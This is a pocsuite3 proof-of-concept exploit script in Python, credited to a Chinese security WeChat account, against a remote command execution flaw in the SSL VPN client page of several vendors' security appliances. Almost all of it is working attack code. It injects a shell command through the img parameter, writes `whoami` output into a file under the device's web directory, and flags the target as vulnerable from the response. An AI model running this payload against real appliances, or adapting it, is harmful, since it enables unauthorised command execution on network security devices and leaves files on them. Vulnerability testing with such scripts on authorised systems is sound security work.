# _*_ coding:utf-8 _*_
# @Time : 2023/12/7 20:02
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class sslvpnclient(POCBase):
    pocDesc = '''安全设备远程命令执行漏洞'''
    vulID = '20231207'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-12-07'
    createDate = '2023-12-07'
    updateDate = '2023-12-07'
    name = '多厂商安全设备远程命令执行漏洞'
    appName = '多个安全厂商安全设备'



    def _verify(self):

        result = {}
        path = '/sslvpn/sslvpn_client.php?client=logoImg&img='
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
        }
        payload = "x /tmp|echo `whoami` |tee /usr/local/webui/sslvpn/security.txt|ls"
        url = self.url + path + payload

        try:
            respnose = requests.get(url, headers=headers, timeout=4, verify=False)
            if respnose.status_code == 200 and 'tmp' in respnose.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(sslvpnclient)